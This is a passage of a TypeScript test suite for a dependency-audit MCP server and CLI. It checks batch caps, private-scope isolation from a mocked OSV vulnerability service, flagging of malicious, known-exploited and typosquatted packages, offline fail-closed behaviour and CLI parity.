      // Assert compiled lib/analysis/static-triage.mjs resolves catalog/triage-rules.json with exact RULESET_SHA256 parity
      const compiledMod = (await import(pathToFileURL(join(installedDir, "lib", "analysis", "static-triage.mjs")).href)) as {
        RULESET_SHA256: string;
      };
      assert.equal(compiledMod.RULESET_SHA256, RULESET_SHA256);
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("enforces audit_manifest_batch 50-dep cap, private-scope OSV isolation, MAL/KEV/typosquat flagging, <=2000-byte summary, paging, and CLI audit-batch parity", async () => {
    const tmpDir = mkdtempSync(join(tmpdir(), "coldpin-batch-"));
    const rootDir = join(tmpDir, "workspace");
    mkdirSync(rootDir, { recursive: true });

    const queriedOsvNames = new Set<string>();
    const osvServer = createServer((req, res) => {
      const u = new URL(req.url ?? "/", "http://127.0.0.1");
      if (u.pathname === "/v1/querybatch" && req.method === "POST") {
        let raw = "";
        req.on("data", (chunk: Buffer) => {
          raw += chunk.toString("utf8");
        });
        req.on("end", () => {
          const parsed = JSON.parse(raw) as { queries: Array<{ package?: { name?: string } }> };
          const results = parsed.queries.map((q) => {
            const name = q.package?.name ?? "";
            queriedOsvNames.add(name);
            if (name === "evil-batch-pkg") return { vulns: [{ id: "MAL-2026-9999" }] };
            if (name === "kev-batch-pkg") return { vulns: [{ id: "GHSA-kev-7777" }] };
            return { vulns: [] };
          });
          res.writeHead(200, { "content-type": "application/json" });
          res.end(JSON.stringify({ results }));
        });
        return;
      }
      if (u.pathname === "/v1/vulns/MAL-2026-9999") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ id: "MAL-2026-9999", summary: "Malicious batch dropper" }));
        return;
      }
      if (u.pathname === "/v1/vulns/GHSA-kev-7777") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            id: "GHSA-kev-7777",
            summary: "Known exploited batch vuln",
            database_specific: { severity: "HIGH", cisa_kev: true },
          }),
        );
        return;
      }
      res.writeHead(404);
      res.end();
    });
    await new Promise<void>((r) => osvServer.listen(0, "127.0.0.1", () => r()));

    try {
      const port = (osvServer.address() as AddressInfo).port;
      const policyPath = join(tmpDir, "batch-policy.json");
      writeFileSync(
        policyPath,
        JSON.stringify({
          osv_api_url: `http://127.0.0.1:${port}`,
          private_scopes: ["@internal"],
          denied_orgs: ["@banned"],
          block_on_kev: true,
          offline_mode: false,
        }),
      );

      const deps: Record<string, string> = {
        "@banned/pkg": "1.0.0",
        "@internal/secret-lib": "1.0.0",
        "evil-batch-pkg": "1.2.3",
        "kev-batch-pkg": "2.0.0",
        lodahs: "1.0.0",
      };
      for (let i = 1; i <= 50; i++) {
        deps[`z-clean-dep-${String(i).padStart(2, "0")}`] = "1.0.0";
      }
      const manifestPath = join(rootDir, "package.json");
      writeFileSync(
        manifestPath,
        JSON.stringify({ name: "batch-demo", version: "1.0.0", dependencies: deps, devDependencies: { "z-dev-only": "1.0.0" } }),
      );

      const h = createInProcessMcpHarness({
        COLDPIN_ALLOWED_ROOTS: rootDir,
        COLDPIN_POLICY_PATH: policyPath,
        COLDPIN_CACHE_DIR: ":memory:",
      });
      try {
        await h.request("initialize", { protocolVersion: "2025-11-25", clientInfo: { name: "batch-test" } }, 1);
        h.send({ jsonrpc: "2.0", method: "notifications/initialized" });

        // 1. Live batch triage against mocked local OSV server
        const batchRes = await h.request("tools/call", { name: "audit_manifest_batch", arguments: {} }, 2);
        const batchBody = batchRes["result"] as {
          isError: boolean;
          content: Array<{ text: string }>;
          structuredContent: {
            report_id: string;
            total_declared: number;
            evaluated_count: number;
            truncated_at_cap: boolean;
            summary_counts: {
              clean_screened: number;
              flagged_suspicious: number;
              malicious_or_blocked: number;
              unverifiable_offline: number;
            };
            top_flagged: Array<{ package_name: string; status: string }>;
            counts: { flagged: number };
          };
        };
        assert.equal(batchBody.isError, false);
        const summaryBytes = Buffer.byteLength(batchBody.content[0]!.text, "utf8");
        assert.ok(summaryBytes <= 2000, `Batch summary exceeded 2,000-byte / 500-token cap: ${summaryBytes} bytes`);
        assert.equal(batchBody.structuredContent.total_declared, 55);
        assert.equal(batchBody.structuredContent.evaluated_count, 50);
        assert.equal(batchBody.structuredContent.truncated_at_cap, true);
        assert.equal(batchBody.structuredContent.summary_counts.malicious_or_blocked, 4);
        assert.equal(batchBody.structuredContent.summary_counts.flagged_suspicious, 1);
        assert.equal(batchBody.structuredContent.summary_counts.clean_screened, 45);
        assert.equal(batchBody.structuredContent.summary_counts.unverifiable_offline, 0);
        assert.equal(batchBody.structuredContent.top_flagged[0]?.status, "MALICIOUS_OR_BLOCKED");

        // Private & denied packages NEVER leak to OSV
        assert.equal(queriedOsvNames.has("@internal/secret-lib"), false);
        assert.equal(queriedOsvNames.has("@banned/pkg"), false);
        assert.equal(queriedOsvNames.has("evil-batch-pkg"), true);
        assert.equal(queriedOsvNames.has("kev-batch-pkg"), true);

        // 2. Page full flagged list via get_artifact_report
        const pageRes = await h.request(
          "tools/call",
          {
            name: "get_artifact_report",
            arguments: { report_id: batchBody.structuredContent.report_id, section: "observations", offset: 0, limit: 10 },
          },
          3,
        );
        const pageBody = pageRes["result"] as {
          isError: boolean;
          structuredContent: { total: number; items: Array<{ package_name: string; advisory_ids: string[] }> };
        };
        assert.equal(pageBody.isError, false);
        assert.equal(pageBody.structuredContent.total, 5);
        const flaggedNames = new Set(pageBody.structuredContent.items.map((x) => x.package_name));
        assert.ok(flaggedNames.has("@banned/pkg"));
        assert.ok(flaggedNames.has("@internal/secret-lib"));
        assert.ok(flaggedNames.has("evil-batch-pkg"));
        assert.ok(flaggedNames.has("kev-batch-pkg"));
        assert.ok(flaggedNames.has("lodahs"));

        // 3. Offline mode fails closed: unflagged deps become UNVERIFIABLE_OFFLINE (0 clean_screened)
        const offRes = await h.request(
          "tools/call",
          { name: "audit_manifest_batch", arguments: { offline: true } },
          4,
        );
        const offBody = offRes["result"] as {
          isError: boolean;
          structuredContent: {
            summary_counts: { clean_screened: number; unverifiable_offline: number; malicious_or_blocked: number };
          };
        };
        assert.equal(offBody.isError, false);
        assert.equal(offBody.structuredContent.summary_counts.clean_screened, 0);
        assert.equal(offBody.structuredContent.summary_counts.unverifiable_offline, 47);
        assert.equal(offBody.structuredContent.summary_counts.malicious_or_blocked, 2);

        // 4. Compiled CLI `lib/cli.mjs audit-batch` parity (async execFile so in-process osvServer stays responsive!)
        let cliExit = 0;
        let cliOut = "";
        try {
          const { stdout } = await execFileAsync(
            process.execPath,
            ["--no-warnings", resolve("lib/cli.mjs"), "audit-batch", manifestPath, "--policy", policyPath, "--cache-dir", ":memory:", "--json"],
            { encoding: "utf8" },
          );
          cliOut = stdout;
        } catch (err) {
          const e = err as { code?: number; stdout?: string };
          cliExit = typeof e.code === "number" ? e.code : 1;
          cliOut = e.stdout ?? "";
        }
        assert.equal(cliExit, 3);
        const cliJson = JSON.parse(cliOut) as { evaluated_count: number; truncated_at_cap: boolean; summary_counts: { malicious_or_blocked: number } };
        assert.equal(cliJson.evaluated_count, 50);
        assert.equal(cliJson.truncated_at_cap, true);
        assert.equal(cliJson.summary_counts.malicious_or_blocked, 4);
      } finally {
        await h.close();
      }
    } finally {
      osvServer.close();
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});
